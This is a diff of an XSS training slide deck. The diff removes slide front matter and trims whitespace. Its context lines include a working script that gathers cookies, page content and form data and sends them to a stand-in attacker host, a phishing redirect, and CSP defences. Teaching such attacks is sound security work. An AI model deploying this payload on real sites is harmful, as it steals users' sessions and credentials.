@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # Cross-Site Scripting (XSS) Fundamentals
 
 ## Injecting Code Into the Browser
@@ -250,24 +244,24 @@ location='https://evil-login.com/fake-target-login';
 (function() {
     // Collect all cookies
     var cookies = document.cookie;
-    
+
     // Collect page content
     var page = document.body.innerHTML;
-    
+
     // Collect form data
     var forms = document.querySelectorAll('form');
     var formData = [];
     forms.forEach(function(f) {
         formData.push(f.action + ': ' + f.innerHTML);
     });
-    
+
     // Send to attacker
     var data = btoa(JSON.stringify({
         cookies: cookies,
         url: location.href,
         forms: formData
     }));
-    
+
     new Image().src = 'https://attacker.com/c?d=' + data;
 })();
 </script>
@@ -473,7 +467,7 @@ return <div dangerouslySetInnerHTML={{__html: userInput}} />;
 # It controls which resources can load and execute
 
 # Basic CSP header
-Content-Security-Policy: 
+Content-Security-Policy:
     default-src 'self';
     script-src 'self' https://trusted-cdn.com;
     style-src 'self' 'unsafe-inline';
@@ -484,7 +478,7 @@ Content-Security-Policy:
     form-action 'self';
 
 # Strict CSP with nonces
-Content-Security-Policy: 
+Content-Security-Policy:
     script-src 'nonce-random123' 'strict-dynamic';
 
 # In HTML:
